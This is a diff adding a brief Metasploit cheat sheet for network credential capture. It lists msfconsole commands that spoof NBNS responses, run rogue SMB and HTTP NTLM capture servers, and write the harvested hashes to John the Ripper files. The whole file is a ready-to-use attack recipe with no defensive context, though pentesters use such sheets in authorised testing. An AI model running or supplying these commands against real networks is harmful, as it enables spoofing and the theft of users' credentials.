@@ -1,0 +1,23 @@
+#SMB Capture Cheat Sheet
+===============================
+
+#NBNS Spoof / Capture
+
+NBNS Spoof
+msf > use auxiliary/spoof/nbns/nbns_response
+msf auxiliary(nbns_response) > show options
+msf auxiliary(nbns_response) > set INTERFACE eth0
+msf auxiliary(nbns_response) > set SPOOFIP 10.10.10.10
+msf auxiliary(nbns_response) > run
+
+SMB Capture
+msf > use auxiliary/server/capture/smb
+msf auxiliary(smb) > set JOHNPWFILE /tmp/john_smb
+msf auxiliary(smb) > run
+
+HTTP NTML Capture
+msf auxiliary(smb) > use auxiliary/server/capture/http_ntlm
+msf auxiliary(smb) > set JOHNPWFILE /tmp/john_http
+msf auxiliary(smb) > set SRVPORT 80
+msf auxiliary(smb) > set URIPATH /
+msf auxiliary(smb) > run
